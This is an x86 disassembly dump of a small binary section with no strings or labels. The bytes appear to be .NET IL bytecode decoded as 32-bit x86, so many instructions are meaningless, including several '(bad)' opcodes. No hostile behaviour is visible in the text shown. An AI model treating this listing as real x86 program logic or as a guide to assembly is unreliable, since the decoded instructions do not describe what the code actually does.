  403637:	00 00                	add    %al,(%eax)
  403639:	0a 6f 54             	or     0x54(%edi),%ch
  40363c:	00 00                	add    %al,(%eax)
  40363e:	0a 00                	or     (%eax),%al
  403640:	00 28                	add    %ch,(%eax)
  403642:	55                   	push   %ebp
  403643:	00 00                	add    %al,(%eax)
  403645:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403648:	0d 2b 12 08 09       	or     $0x908122b,%eax
  40364d:	9a 13 04 06 11 04 6f 	lcall  $0x6f04,$0x11060413
  403654:	54                   	push   %esp
  403655:	00 00                	add    %al,(%eax)
  403657:	0a 00                	or     (%eax),%al
  403659:	09 17                	or     %edx,(%edi)
  40365b:	58                   	pop    %eax
  40365c:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403661:	32 e8                	xor    %al,%ch
  403663:	16                   	push   %ss
  403664:	0b 00                	or     (%eax),%eax
  403666:	06                   	push   %es
  403667:	6f                   	outsl  %ds:(%esi),(%dx)
  403668:	56                   	push   %esi
  403669:	00 00                	add    %al,(%eax)
  40366b:	0a 13                	or     (%ebx),%dl
  40366d:	05 38 bd 00 00       	add    $0xbd38,%eax
  403672:	00 12                	add    %dl,(%edx)
  403674:	05 28 57 00 00       	add    $0x5728,%eax
  403679:	0a 13                	or     (%ebx),%dl
  40367b:	06                   	push   %es
  40367c:	00 07                	add    %al,(%edi)
  40367e:	20 b8 0b 00 00 fe    	and    %bh,-0x1fffff5(%eax)
  403684:	04 16                	add    $0x16,%al
  403686:	fe 01                	incb   (%ecx)
  403688:	13 07                	adc    (%edi),%eax
  40368a:	11 07                	adc    %eax,(%edi)
  40368c:	2c 05                	sub    $0x5,%al
  40368e:	38 a9 00 00 00 00    	cmp    %ch,0x0(%ecx)
  403694:	00 11                	add    %dl,(%ecx)
  403696:	06                   	push   %es
  403697:	28 47 00             	sub    %al,0x0(%edi)
  40369a:	00 0a                	add    %cl,(%edx)
  40369c:	16                   	push   %ss
  40369d:	fe 01                	incb   (%ecx)
  40369f:	13 08                	adc    (%eax),%ecx
  4036a1:	11 08                	adc    %ecx,(%eax)
  4036a3:	2c 05                	sub    $0x5,%al
  4036a5:	dd 86 00 00 00 16    	fldl   0x16000000(%esi)
  4036ab:	13 09                	adc    (%ecx),%ecx
  4036ad:	2b 61 00             	sub    0x0(%ecx),%esp
  4036b0:	02 02                	add    (%edx),%al
  4036b2:	7b 0a                	jnp    0x4036be
  4036b4:	00 00                	add    %al,(%eax)
  4036b6:	04 1e                	add    $0x1e,%al
  4036b8:	1f                   	pop    %ds
  4036b9:	14 6f                	adc    $0x6f,%al
  4036bb:	58                   	pop    %eax
  4036bc:	00 00                	add    %al,(%eax)
  4036be:	0a 28                	or     (%eax),%ch
  4036c0:	20 00                	and    %al,(%eax)
  4036c2:	00 06                	add    %al,(%esi)
  4036c4:	72 b9                	jb     0x40367f
  4036c6:	18 00                	sbb    %al,(%eax)
  4036c8:	70 28                	jo     0x4036f2
  4036ca:	3f                   	aas
  4036cb:	00 00                	add    %al,(%eax)
  4036cd:	0a 13                	or     (%ebx),%dl
  4036cf:	0a 11                	or     (%ecx),%dl
  4036d1:	06                   	push   %es
  4036d2:	11 0a                	adc    %ecx,(%edx)
  4036d4:	28 42 00             	sub    %al,0x0(%edx)
  4036d7:	00 0a                	add    %cl,(%edx)
  4036d9:	13 0b                	adc    (%ebx),%ecx
  4036db:	11 0b                	adc    %ecx,(%ebx)
  4036dd:	28 43 00             	sub    %al,0x0(%ebx)
  4036e0:	00 0a                	add    %cl,(%edx)
  4036e2:	16                   	push   %ss
  4036e3:	fe 01                	incb   (%ecx)
  4036e5:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4036e8:	0c 2c                	or     $0x2c,%al
  4036ea:	1e                   	push   %ds
  4036eb:	00 02                	add    %al,(%edx)
  4036ed:	7b 0b                	jnp    0x4036fa
  4036ef:	00 00                	add    %al,(%eax)
  4036f1:	04 11                	add    $0x11,%al
  4036f3:	0b 17                	or     (%edi),%edx
  4036f5:	28 48 00             	sub    %cl,0x0(%eax)
  4036f8:	00 0a                	add    %cl,(%edx)
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	0b 18                	or     (%eax),%ebx
  4036fe:	28 4a 00             	sub    %cl,0x0(%edx)
  403701:	00 0a                	add    %cl,(%edx)
  403703:	00 07                	add    %al,(%edi)
  403705:	17                   	pop    %ss
  403706:	58                   	pop    %eax
  403707:	0b 00                	or     (%eax),%eax
  403709:	00 11                	add    %dl,(%ecx)
  40370b:	09 17                	or     %edx,(%edi)
  40370d:	58                   	pop    %eax
  40370e:	13 09                	adc    (%ecx),%ecx
  403710:	11 09                	adc    %ecx,(%ecx)
  403712:	1f                   	pop    %ds
  403713:	1e                   	push   %ds
  403714:	2f                   	das
  403715:	0a 07                	or     (%edi),%al
  403717:	20 b8 0b 00 00 fe    	and    %bh,-0x1fffff5(%eax)
  40371d:	04 2b                	add    $0x2b,%al
  40371f:	01 16                	add    %edx,(%esi)
  403721:	13 0d 11 0d 2d 88    	adc    0x882d0d11,%ecx
  403727:	00 de                	add    %bl,%dh
  403729:	05 26 00 00 de       	add    $0xde000026,%eax
  40372e:	00 00                	add    %al,(%eax)
  403730:	12 05 28 59 00 00    	adc    0x5928,%al
  403736:	0a 3a                	or     (%edx),%bh
  403738:	37                   	aaa
  403739:	ff                   	(bad)
  40373a:	ff                   	(bad)
  40373b:	ff                   	lcall  (bad)
  40373c:	de 0f                	fimuls (%edi)
  40373e:	12 05 fe 16 09 00    	adc    0x916fe,%al
  403744:	00 1b                	add    %bl,(%ebx)
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40374c:	dc 02                	faddl  (%edx)
  40374e:	72 c3                	jb     0x403713
  403750:	18 00                	sbb    %al,(%eax)
  403752:	70 07                	jo     0x40375b
  403754:	8c 3b                	mov    %?,(%ebx)
  403756:	00 00                	add    %al,(%eax)
  403758:	01 28                	add    %ebp,(%eax)
  40375a:	5a                   	pop    %edx
  40375b:	00 00                	add    %al,(%eax)
  40375d:	0a 28                	or     (%eax),%ch
  40375f:	30 00                	xor    %al,(%eax)
  403761:	00 06                	add    %al,(%esi)
  403763:	00 00                	add    %al,(%eax)
  403765:	de 05 26 00 00 de    	fiadds 0xde000026
  40376b:	00 2a                	add    %ch,(%edx)
  40376d:	00 00                	add    %al,(%eax)
  40376f:	00 41 4c             	add    %al,0x4c(%ecx)
  403772:	00 00                	add    %al,(%eax)
  403774:	00 00                	add    %al,(%eax)
  403776:	00 00                	add    %al,(%eax)
  403778:	e4 00                	in     $0x0,%al
  40377a:	00 00                	add    %al,(%eax)
  40377c:	96                   	xchg   %eax,%esi
  40377d:	00 00                	add    %al,(%eax)
  40377f:	00 7a 01             	add    %bh,0x1(%edx)
  403782:	00 00                	add    %al,(%eax)
  403784:	05 00 00 00 12       	add    $0x12000000,%eax
  403789:	00 00                	add    %al,(%eax)
  40378b:	01 02                	add    %eax,(%edx)
  40378d:	00 00                	add    %al,(%eax)
  40378f:	00 be 00 00 00 d0    	add    %bh,-0x30000000(%esi)
  403795:	00 00                	add    %al,(%eax)
  403797:	00 8e 01 00 00 0f    	add    %cl,0xf000001(%esi)
	...
  4037a5:	00 00                	add    %al,(%eax)
  4037a7:	00 01                	add    %al,(%ecx)
  4037a9:	00 00                	add    %al,(%eax)
  4037ab:	00 b6 01 00 00 b7    	add    %dh,-0x48ffffff(%esi)
  4037b1:	01 00                	add    %eax,(%eax)
  4037b3:	00 05 00 00 00 12    	add    %al,0x12000000
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	01 13                	add    %edx,(%ebx)
  4037bd:	30 03                	xor    %al,(%ebx)
  4037bf:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	07                   	pop    %es
  4037c5:	00 00                	add    %al,(%eax)
  4037c7:	11 00                	adc    %eax,(%eax)
  4037c9:	72 ef                	jb     0x4037ba
  4037cb:	18 00                	sbb    %al,(%eax)
  4037cd:	70 03                	jo     0x4037d2
  4037cf:	28 01                	sub    %al,(%ecx)
  4037d1:	00 00                	add    %al,(%eax)
  4037d3:	2b 02                	sub    (%edx),%eax
  4037d5:	fe 06                	incb   (%esi)
  4037d7:	37                   	aaa
  4037d8:	00 00                	add    %al,(%eax)
  4037da:	06                   	push   %es
  4037db:	73 5c                	jae    0x403839
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 28                	or     (%eax),%ch
  4037e1:	02 00                	add    (%eax),%al
  4037e3:	00 2b                	add    %ch,(%ebx)
  4037e5:	28 03                	sub    %al,(%ebx)
  4037e7:	00 00                	add    %al,(%eax)
  4037e9:	2b 73 5f             	sub    0x5f(%ebx),%esi
  4037ec:	00 00                	add    %al,(%eax)
  4037ee:	0a 0a                	or     (%edx),%cl
  4037f0:	2b 00                	sub    (%eax),%eax
  4037f2:	06                   	push   %es
  4037f3:	2a 1b                	sub    (%ebx),%bl
  4037f5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4037f8:	70 00                	jo     0x4037fa
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	0e                   	push   %cs
  4037fd:	00 00                	add    %al,(%eax)
  4037ff:	11 00                	adc    %eax,(%eax)
  403801:	7e 29                	jle    0x40382c
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 72 7e             	or     0x7e(%edx),%dh
  403808:	14 00                	adc    $0x0,%al
  40380a:	70 17                	jo     0x403823
  40380c:	6f                   	outsl  %ds:(%esi),(%dx)
  40380d:	38 00                	cmp    %al,(%eax)
  40380f:	00 0a                	add    %cl,(%edx)
  403811:	0a 00                	or     (%eax),%al
  403813:	06                   	push   %es
  403814:	14 fe                	adc    $0xfe,%al
  403816:	03 0b                	add    (%ebx),%ecx
  403818:	07                   	pop    %es
  403819:	2c 13                	sub    $0x13,%al
  40381b:	06                   	push   %es
  40381c:	72 6d                	jb     0x40388b
  40381e:	19 00                	sbb    %eax,(%eax)
  403820:	70 17                	jo     0x403839
  403822:	8c 3b                	mov    %?,(%ebx)
  403824:	00 00                	add    %al,(%eax)
  403826:	01 1a                	add    %ebx,(%edx)
  403828:	6f                   	outsl  %ds:(%esi),(%dx)
  403829:	40                   	inc    %eax
  40382a:	00 00                	add    %al,(%eax)
  40382c:	0a 00                	or     (%eax),%al
  40382e:	00 de                	add    %bl,%dh
  403830:	0b 06                	or     (%esi),%eax
  403832:	2c 07                	sub    $0x7,%al
  403834:	06                   	push   %es
  403835:	6f                   	outsl  %ds:(%esi),(%dx)
  403836:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40383b:	dc 00                	faddl  (%eax)
  40383d:	72 8b                	jb     0x4037ca
  40383f:	19 00                	sbb    %eax,(%eax)
  403841:	70 28                	jo     0x40386b
  403843:	60                   	pusha
  403844:	00 00                	add    %al,(%eax)
  403846:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403849:	0d 2b 11 08 09       	or     $0x908112b,%eax
  40384e:	9a 13 04 11 04 6f 61 	lcall  $0x616f,$0x4110413
  403855:	00 00                	add    %al,(%eax)
  403857:	0a 00                	or     (%eax),%al
  403859:	09 17                	or     %edx,(%edi)
  40385b:	58                   	pop    %eax
  40385c:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403861:	32 e9                	xor    %cl,%ch
  403863:	02 72 9b             	add    -0x65(%edx),%dh
  403866:	19 00                	sbb    %eax,(%eax)
  403868:	70 28                	jo     0x403892
  40386a:	30 00                	xor    %al,(%eax)
  40386c:	00 06                	add    %al,(%esi)
  40386e:	00 2a                	add    %ch,(%edx)
  403870:	01 10                	add    %edx,(%eax)
  403872:	00 00                	add    %al,(%eax)
  403874:	02 00                	add    (%eax),%al
  403876:	12 00                	adc    (%eax),%al
  403878:	1f                   	pop    %ds
  403879:	31 00                	xor    %eax,(%eax)
  40387b:	0b 00                	or     (%eax),%eax
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 1b                	add    %bl,(%ebx)
  403881:	30 04 00             	xor    %al,(%eax,%eax,1)
  403884:	49                   	dec    %ecx
  403885:	00 00                	add    %al,(%eax)
  403887:	00 09                	add    %cl,(%ecx)
  403889:	00 00                	add    %al,(%eax)
  40388b:	11 00                	adc    %eax,(%eax)
  40388d:	7e 29                	jle    0x4038b8
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 72 cb             	or     -0x35(%edx),%dh
  403894:	19 00                	sbb    %eax,(%eax)
  403896:	70 17                	jo     0x4038af
  403898:	6f                   	outsl  %ds:(%esi),(%dx)
  403899:	38 00                	cmp    %al,(%eax)
  40389b:	00 0a                	add    %cl,(%edx)
  40389d:	0a 00                	or     (%eax),%al
  40389f:	06                   	push   %es
  4038a0:	14 fe                	adc    $0xfe,%al
  4038a2:	03 0b                	add    (%ebx),%ecx
  4038a4:	07                   	pop    %es
  4038a5:	2c 13                	sub    $0x13,%al
  4038a7:	06                   	push   %es
  4038a8:	72 4e                	jb     0x4038f8
  4038aa:	1a 00                	sbb    (%eax),%al
  4038ac:	70 17                	jo     0x4038c5
  4038ae:	8c 3b                	mov    %?,(%ebx)
  4038b0:	00 00                	add    %al,(%eax)
  4038b2:	01 1a                	add    %ebx,(%edx)
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	40                   	inc    %eax
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	0a 00                	or     (%eax),%al
  4038ba:	00 de                	add    %bl,%dh
  4038bc:	0b 06                	or     (%esi),%eax
  4038be:	2c 07                	sub    $0x7,%al
  4038c0:	06                   	push   %es
  4038c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c2:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4038c7:	dc 02                	faddl  (%edx)
  4038c9:	72 76                	jb     0x403941
  4038cb:	1a 00                	sbb    (%eax),%al
  4038cd:	70 28                	jo     0x4038f7
  4038cf:	30 00                	xor    %al,(%eax)
  4038d1:	00 06                	add    %al,(%esi)
  4038d3:	00 2a                	add    %ch,(%edx)
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	00 01                	add    %al,(%ecx)
  4038d9:	10 00                	adc    %al,(%eax)
  4038db:	00 02                	add    %al,(%edx)
  4038dd:	00 12                	add    %dl,(%edx)
  4038df:	00 1f                	add    %bl,(%edi)
  4038e1:	31 00                	xor    %eax,(%eax)
  4038e3:	0b 00                	or     (%eax),%eax
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	00 1b                	add    %bl,(%ebx)
  4038e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4038ec:	61                   	popa
  4038ed:	00 00                	add    %al,(%eax)
  4038ef:	00 0f                	add    %cl,(%edi)
  4038f1:	00 00                	add    %al,(%eax)
  4038f3:	11 00                	adc    %eax,(%eax)
  4038f5:	28 4b 00             	sub    %cl,0x0(%ebx)
  4038f8:	00 0a                	add    %cl,(%edx)
  4038fa:	72 b0                	jb     0x4038ac
  4038fc:	1a 00                	sbb    (%eax),%al
  4038fe:	70 28                	jo     0x403928
  403900:	3f                   	aas
  403901:	00 00                	add    %al,(%eax)
  403903:	0a 0a                	or     (%edx),%cl
  403905:	17                   	pop    %ss
  403906:	17                   	pop    %ss
  403907:	73 62                	jae    0x40396b
  403909:	00 00                	add    %al,(%eax)
  40390b:	0a 0b                	or     (%ebx),%cl
  40390d:	00 07                	add    %al,(%edi)
  40390f:	28 63 00             	sub    %ah,0x0(%ebx)
  403912:	00 0a                	add    %cl,(%edx)
  403914:	0c 08                	or     $0x8,%al
  403916:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40391a:	0a 6f 65             	or     0x65(%edi),%ch
  40391d:	00 00                	add    %al,(%eax)
  40391f:	0a 00                	or     (%eax),%al
  403921:	de 0b                	fimuls (%ebx)
  403923:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403926:	08 6f 2d             	or     %ch,0x2d(%edi)
  403929:	00 00                	add    %al,(%eax)
  40392b:	0a 00                	or     (%eax),%al
  40392d:	dc 07                	faddl  (%edi)
  40392f:	06                   	push   %es
  403930:	28 66 00             	sub    %ah,0x0(%esi)
  403933:	00 0a                	add    %cl,(%edx)
  403935:	6f                   	outsl  %ds:(%esi),(%dx)
  403936:	67 00 00             	add    %al,(%bx,%si)
  403939:	0a 00                	or     (%eax),%al
  40393b:	00 de                	add    %bl,%dh
  40393d:	0b 07                	or     (%edi),%eax
  40393f:	2c 07                	sub    $0x7,%al
  403941:	07                   	pop    %es
  403942:	6f                   	outsl  %ds:(%esi),(%dx)
  403943:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403948:	dc 1f                	fcompl (%edi)
  40394a:	14 16                	adc    $0x16,%al
  40394c:	06                   	push   %es
  40394d:	19 28                	sbb    %ebp,(%eax)
  40394f:	0f 00 00             	sldt   (%eax)
  403952:	06                   	push   %es
  403953:	26 2a 00             	sub    %es:(%eax),%al
  403956:	00 00                	add    %al,(%eax)
  403958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40395b:	00 02                	add    %al,(%edx)
  40395d:	00 21                	add    %ah,(%ecx)
  40395f:	00 0e                	add    %cl,(%esi)
  403961:	2f                   	das
  403962:	00 0b                	add    %cl,(%ebx)
  403964:	00 00                	add    %al,(%eax)
  403966:	00 00                	add    %al,(%eax)
  403968:	02 00                	add    (%eax),%al
  40396a:	19 00                	sbb    %eax,(%eax)
  40396c:	31 4a 00             	xor    %ecx,0x0(%edx)
  40396f:	0b 00                	or     (%eax),%eax
  403971:	00 00                	add    %al,(%eax)
  403973:	00 1b                	add    %bl,(%ebx)
  403975:	30 04 00             	xor    %al,(%eax,%eax,1)
  403978:	49                   	dec    %ecx
  403979:	00 00                	add    %al,(%eax)
  40397b:	00 09                	add    %cl,(%ecx)
  40397d:	00 00                	add    %al,(%eax)
  40397f:	11 00                	adc    %eax,(%eax)
  403981:	7e 29                	jle    0x4039ac
  403983:	00 00                	add    %al,(%eax)
  403985:	0a 72 7e             	or     0x7e(%edx),%dh
  403988:	14 00                	adc    $0x0,%al
  40398a:	70 17                	jo     0x4039a3
  40398c:	6f                   	outsl  %ds:(%esi),(%dx)
  40398d:	38 00                	cmp    %al,(%eax)
  40398f:	00 0a                	add    %cl,(%edx)
  403991:	0a 00                	or     (%eax),%al
  403993:	06                   	push   %es
  403994:	14 fe                	adc    $0xfe,%al
  403996:	03 0b                	add    (%ebx),%ecx
  403998:	07                   	pop    %es
  403999:	2c 13                	sub    $0x13,%al
  40399b:	06                   	push   %es
  40399c:	72 c4                	jb     0x403962
  40399e:	1a 00                	sbb    (%eax),%al
  4039a0:	70 17                	jo     0x4039b9
  4039a2:	8c 3b                	mov    %?,(%ebx)
  4039a4:	00 00                	add    %al,(%eax)
  4039a6:	01 1a                	add    %ebx,(%edx)
  4039a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4039a9:	40                   	inc    %eax
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	0a 00                	or     (%eax),%al
  4039ae:	00 de                	add    %bl,%dh
  4039b0:	0b 06                	or     (%esi),%eax
  4039b2:	2c 07                	sub    $0x7,%al
  4039b4:	06                   	push   %es
  4039b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4039b6:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4039bb:	dc 02                	faddl  (%edx)
  4039bd:	72 ee                	jb     0x4039ad
  4039bf:	1a 00                	sbb    (%eax),%al
  4039c1:	70 28                	jo     0x4039eb
  4039c3:	30 00                	xor    %al,(%eax)
  4039c5:	00 06                	add    %al,(%esi)
  4039c7:	00 2a                	add    %ch,(%edx)
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	00 01                	add    %al,(%ecx)
  4039cd:	10 00                	adc    %al,(%eax)
  4039cf:	00 02                	add    %al,(%edx)
  4039d1:	00 12                	add    %dl,(%edx)
  4039d3:	00 1f                	add    %bl,(%edi)
  4039d5:	31 00                	xor    %eax,(%eax)
  4039d7:	0b 00                	or     (%eax),%eax
  4039d9:	00 00                	add    %al,(%eax)
  4039db:	00 1b                	add    %bl,(%ebx)
  4039dd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4039e0:	9f                   	lahf
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	00 10                	add    %dl,(%eax)
  4039e5:	00 00                	add    %al,(%eax)
  4039e7:	11 00                	adc    %eax,(%eax)
  4039e9:	7e 29                	jle    0x403a14
  4039eb:	00 00                	add    %al,(%eax)
  4039ed:	0a 72 16             	or     0x16(%edx),%dh
  4039f0:	1b 00                	sbb    (%eax),%eax
  4039f2:	70 17                	jo     0x403a0b
  4039f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f5:	38 00                	cmp    %al,(%eax)
  4039f7:	00 0a                	add    %cl,(%edx)
  4039f9:	0a 00                	or     (%eax),%al
  4039fb:	06                   	push   %es
  4039fc:	14 fe                	adc    $0xfe,%al
  4039fe:	03 0b                	add    (%ebx),%ecx
  403a00:	07                   	pop    %es
  403a01:	2c 13                	sub    $0x13,%al
  403a03:	06                   	push   %es
  403a04:	72 6c                	jb     0x403a72
  403a06:	1b 00                	sbb    (%eax),%eax
  403a08:	70 18                	jo     0x403a22
  403a0a:	8c 3b                	mov    %?,(%ebx)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	01 1a                	add    %ebx,(%edx)
  403a10:	6f                   	outsl  %ds:(%esi),(%dx)
  403a11:	40                   	inc    %eax
  403a12:	00 00                	add    %al,(%eax)
  403a14:	0a 00                	or     (%eax),%al
  403a16:	00 de                	add    %bl,%dh
  403a18:	0b 06                	or     (%esi),%eax
  403a1a:	2c 07                	sub    $0x7,%al
  403a1c:	06                   	push   %es
  403a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a1e:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403a23:	dc 00                	faddl  (%eax)
  403a25:	72 82                	jb     0x4039a9
  403a27:	1b 00                	sbb    (%eax),%eax
  403a29:	70 28                	jo     0x403a53
  403a2b:	60                   	pusha
  403a2c:	00 00                	add    %al,(%eax)
  403a2e:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403a31:	0d 2b 11 08 09       	or     $0x908112b,%eax
  403a36:	9a 13 04 11 04 6f 61 	lcall  $0x616f,$0x4110413
  403a3d:	00 00                	add    %al,(%eax)
  403a3f:	0a 00                	or     (%eax),%al
  403a41:	09 17                	or     %edx,(%edi)
  403a43:	58                   	pop    %eax
  403a44:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403a49:	32 e9                	xor    %cl,%ch
  403a4b:	00 72 8a             	add    %dh,-0x76(%edx)
  403a4e:	1b 00                	sbb    (%eax),%eax
  403a50:	70 28                	jo     0x403a7a
  403a52:	60                   	pusha
  403a53:	00 00                	add    %al,(%eax)
  403a55:	0a 13                	or     (%ebx),%dl
  403a57:	05 16 13 06 2b       	add    $0x2b061316,%eax
  403a5c:	15 11 05 11 06       	adc    $0x6110511,%eax
  403a61:	9a 13 07 11 07 6f 61 	lcall  $0x616f,$0x7110713
  403a68:	00 00                	add    %al,(%eax)
  403a6a:	0a 00                	or     (%eax),%al
  403a6c:	11 06                	adc    %eax,(%esi)
  403a6e:	17                   	pop    %ss
  403a6f:	58                   	pop    %eax
  403a70:	13 06                	adc    (%esi),%eax
  403a72:	11 06                	adc    %eax,(%esi)
  403a74:	11 05 8e 69 32 e3    	adc    %eax,0xe332698e
  403a7a:	02 72 a0             	add    -0x60(%edx),%dh
  403a7d:	1b 00                	sbb    (%eax),%eax
  403a7f:	70 28                	jo     0x403aa9
  403a81:	30 00                	xor    %al,(%eax)
  403a83:	00 06                	add    %al,(%esi)
  403a85:	00 2a                	add    %ch,(%edx)
  403a87:	00 01                	add    %al,(%ecx)
  403a89:	10 00                	adc    %al,(%eax)
  403a8b:	00 02                	add    %al,(%edx)
  403a8d:	00 12                	add    %dl,(%edx)
  403a8f:	00 1f                	add    %bl,(%edi)
  403a91:	31 00                	xor    %eax,(%eax)
  403a93:	0b 00                	or     (%eax),%eax
  403a95:	00 00                	add    %al,(%eax)
  403a97:	00 1b                	add    %bl,(%ebx)
  403a99:	30 03                	xor    %al,(%ebx)
  403a9b:	00 63 00             	add    %ah,0x0(%ebx)
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	09 00                	or     %eax,(%eax)
  403aa2:	00 11                	add    %dl,(%ecx)
  403aa4:	00 7e 39             	add    %bh,0x39(%esi)
  403aa7:	00 00                	add    %al,(%eax)
  403aa9:	0a 72 d8             	or     -0x28(%edx),%dh
  403aac:	1b 00                	sbb    (%eax),%eax
  403aae:	70 17                	jo     0x403ac7
  403ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab1:	38 00                	cmp    %al,(%eax)
  403ab3:	00 0a                	add    %cl,(%edx)
  403ab5:	0a 00                	or     (%eax),%al
  403ab7:	06                   	push   %es
  403ab8:	14 fe                	adc    $0xfe,%al
  403aba:	03 0b                	add    (%ebx),%ecx
  403abc:	07                   	pop    %es
  403abd:	2c 2d                	sub    $0x2d,%al
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	06                   	push   %es
  403ac2:	72 2c                	jb     0x403af0
  403ac4:	1c 00                	sbb    $0x0,%al
  403ac6:	70 6f                	jo     0x403b37
  403ac8:	68 00 00 0a 00       	push   $0xa0000
  403acd:	00 de                	add    %bl,%dh
  403acf:	05 26 00 00 de       	add    $0xde000026,%eax
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	00 06                	add    %al,(%esi)
  403ad8:	72 3c                	jb     0x403b16
  403ada:	1c 00                	sbb    $0x0,%al
  403adc:	70 6f                	jo     0x403b4d
  403ade:	68 00 00 0a 00       	push   $0xa0000
  403ae3:	00 de                	add    %bl,%dh
  403ae5:	05 26 00 00 de       	add    $0xde000026,%eax
  403aea:	00 00                	add    %al,(%eax)
  403aec:	00 de                	add    %bl,%dh
  403aee:	0b 06                	or     (%esi),%eax
  403af0:	2c 07                	sub    $0x7,%al
  403af2:	06                   	push   %es
  403af3:	6f                   	outsl  %ds:(%esi),(%dx)
  403af4:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403af9:	dc 02                	faddl  (%edx)
  403afb:	72 4c                	jb     0x403b49
  403afd:	1c 00                	sbb    $0x0,%al
  403aff:	70 28                	jo     0x403b29
  403b01:	30 00                	xor    %al,(%eax)
  403b03:	00 06                	add    %al,(%esi)
  403b05:	00 2a                	add    %ch,(%edx)
  403b07:	00 01                	add    %al,(%ecx)
  403b09:	28 00                	sub    %al,(%eax)
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403b10:	10 2c 00             	adc    %ch,(%eax,%eax,1)
  403b13:	05 12 00 00 01       	add    $0x1000012,%eax
  403b18:	00 00                	add    %al,(%eax)
  403b1a:	32 00                	xor    (%eax),%al
  403b1c:	10 42 00             	adc    %al,0x0(%edx)
  403b1f:	05 12 00 00 01       	add    $0x1000012,%eax
  403b24:	02 00                	add    (%eax),%al
  403b26:	12 00                	adc    (%eax),%al
  403b28:	39 4b 00             	cmp    %ecx,0x0(%ebx)
  403b2b:	0b 00                	or     (%eax),%eax
  403b2d:	00 00                	add    %al,(%eax)
  403b2f:	00 9a 00 02 72 76    	add    %bl,0x76720200(%edx)
  403b35:	1c 00                	sbb    $0x0,%al
  403b37:	70 28                	jo     0x403b61
  403b39:	32 00                	xor    (%eax),%al
  403b3b:	00 06                	add    %al,(%esi)
  403b3d:	00 02                	add    %al,(%edx)
  403b3f:	72 be                	jb     0x403aff
  403b41:	1c 00                	sbb    $0x0,%al
  403b43:	70 28                	jo     0x403b6d
  403b45:	32 00                	xor    (%eax),%al
  403b47:	00 06                	add    %al,(%esi)
  403b49:	00 02                	add    %al,(%edx)
  403b4b:	72 ec                	jb     0x403b39
  403b4d:	1c 00                	sbb    $0x0,%al
  403b4f:	70 28                	jo     0x403b79
  403b51:	30 00                	xor    %al,(%eax)
  403b53:	00 06                	add    %al,(%esi)
  403b55:	00 2a                	add    %ch,(%edx)
  403b57:	00 1b                	add    %bl,(%ebx)
  403b59:	30 04 00             	xor    %al,(%eax,%eax,1)
  403b5c:	49                   	dec    %ecx
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	00 09                	add    %cl,(%ecx)
  403b61:	00 00                	add    %al,(%eax)
  403b63:	11 00                	adc    %eax,(%eax)
  403b65:	7e 39                	jle    0x403ba0
  403b67:	00 00                	add    %al,(%eax)
  403b69:	0a 72 22             	or     0x22(%edx),%dh
  403b6c:	1d 00 70 17 6f       	sbb    $0x6f177000,%eax
  403b71:	38 00                	cmp    %al,(%eax)
  403b73:	00 0a                	add    %cl,(%edx)
  403b75:	0a 00                	or     (%eax),%al
  403b77:	06                   	push   %es
  403b78:	14 fe                	adc    $0xfe,%al
  403b7a:	03 0b                	add    (%ebx),%ecx
  403b7c:	07                   	pop    %es
  403b7d:	2c 13                	sub    $0x13,%al
  403b7f:	06                   	push   %es
  403b80:	72 7e                	jb     0x403c00
  403b82:	1d 00 70 18 8c       	sbb    $0x8c187000,%eax
  403b87:	3b 00                	cmp    (%eax),%eax
  403b89:	00 01                	add    %al,(%ecx)
  403b8b:	1a 6f 40             	sbb    0x40(%edi),%ch
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 00                	or     (%eax),%al
  403b92:	00 de                	add    %bl,%dh
  403b94:	0b 06                	or     (%esi),%eax
  403b96:	2c 07                	sub    $0x7,%al
  403b98:	06                   	push   %es
  403b99:	6f                   	outsl  %ds:(%esi),(%dx)
  403b9a:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403b9f:	dc 02                	faddl  (%edx)
  403ba1:	72 94                	jb     0x403b37
